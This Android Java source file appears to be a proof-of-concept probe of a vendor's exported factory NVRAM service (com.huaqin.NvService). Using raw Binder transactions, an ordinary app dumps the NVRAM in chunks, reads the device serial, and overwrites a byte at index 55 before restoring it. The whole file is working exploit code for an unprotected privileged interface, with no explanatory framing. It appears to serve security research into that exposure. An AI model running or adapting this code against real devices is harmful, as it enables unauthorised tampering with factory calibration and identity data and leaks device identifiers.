package com.probe.nvaidl;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class MainActivity extends Activity {
    static final String TAG = "nvprobe";
    static final String PKG = "com.huaqin.NvService";
    static final String CLS = "com.huaqin.NvService.FactoryNvramService";
    static final String DESC = "aidl.NvAidlService";
    static final int SEG = 128;

    static IBinder svc;

    static void log(String s) {
        Log.i(TAG, s);
        System.out.println("[NVP] " + s);
    }

    static String readHex(int start, int end) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESC);
            data.writeInt(start);
            data.writeInt(end);
            svc.transact(2, data, reply, 0);
            int ex = reply.readInt();
            String r = (ex == 0) ? reply.readString() : null;
            data.recycle();
            reply.recycle();
            return r;
        } catch (Throwable t) {
            return null;
        }
    }

    // read whole 0..1024 in SEG chunks, concat
    static String readAll() {
        StringBuilder sb = new StringBuilder();
        for (int s = 0; s < 1024; s += SEG) {
            String r = readHex(s, s + SEG);
            if (r == null) r = "";
            sb.append(r);
        }
        return sb.toString();
    }

    static int write(int idx, int val) {
        try {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            data.writeInterfaceToken(DESC);
            data.writeInt(idx);
            data.writeInt(val);
            svc.transact(3, data, reply, 0);
            int ex = reply.readInt();
            int r = (ex == 0) ? reply.readInt() : -999;
            data.recycle();
            reply.recycle();
            log("W idx=" + idx + " val=" + val + " ex=" + ex + " ret=" + r);
            return r;
        } catch (Throwable t) {
            log("W EX: " + t);
            return -999;
        }
    }

    static int byteAt(int i) {
        String h = readHex(i, i + 1);
        if (h == null || h.length() < 2) return -1;
        return Integer.parseInt(h.substring(0, 2), 16);
    }

    @Override
    protected void onCreate(Bundle bnd) {
        super.onCreate(bnd);
        log("onCreate uid=" + android.os.Process.myUid());
        try {
            Intent it = new Intent();
            it.setComponent(new ComponentName(PKG, CLS));
            it.setAction("com.huaqin.action.factoryNv");
            ServiceConnection conn = new ServiceConnection() {
                public void onServiceConnected(ComponentName n, IBinder bb) {
                    svc = bb;
                    new Thread() {
                        public void run() {
                            try {
                                int T = 55;
                                log("desc=" + svc.getInterfaceDescriptor());

                                // STEP0 backup (segmented)
                                String before = readAll();
                                log("BACKUP len=" + before.length());
                                log("BACKUP[0..64]=" + before.substring(0, Math.min(64, before.length())));

                                int v0 = byteAt(T);
                                log("TARGET idx=" + T + " orig=0x" + Integer.toHexString(v0)
                                        + " ('" + (char) v0 + "')");

                                // STEP1 change to a DIFFERENT value
                                int newSel = (v0 == 0x31) ? 2 : 1;
                                log("STEP1 write idx=" + T + " selector=" + newSel);
                                write(T, newSel);
                                int v1 = byteAt(T);
                                log("VERIFY1 idx=" + T + " = 0x" + Integer.toHexString(v1)
                                        + " ('" + (char) v1 + "') changed=" + (v1 != v0));

                                // STEP2 restore original
                                int backSel = (v0 == 0x31) ? 1 : (v0 == 0x32 ? 2 : 0);
                                log("STEP2 restore idx=" + T + " selector=" + backSel);
                                write(T, backSel);
                                int v2 = byteAt(T);
                                log("VERIFY2 idx=" + T + " = 0x" + Integer.toHexString(v2)
                                        + " ('" + (char) v2 + "') restored=" + (v2 == v0));

                                String after = readAll();
                                log("FINAL identical=" + before.equals(after));
                                if (!before.equals(after)) {
                                    for (int k = 0; k < Math.min(before.length(), after.length()); k++) {
                                        if (before.charAt(k) != after.charAt(k)) {
                                            log("DIFF at hexchar " + k + " (byte " + (k/2) + ") "
                                                    + before.charAt(k) + " -> " + after.charAt(k));
                                            break;
                                        }
                                    }
                                }
                                log("SERIAL=" + readHex(1, 15));
                            } catch (Throwable t) {
                                log("EX: " + t);
                            }
                        }
                    }.start();
                }
                public void onServiceDisconnected(ComponentName n) { log("disc"); }
            };
            log("bind=" + bindService(it, conn, Context.BIND_AUTO_CREATE));
        } catch (Throwable t) {
            log("EX: " + t);
        }
    }
}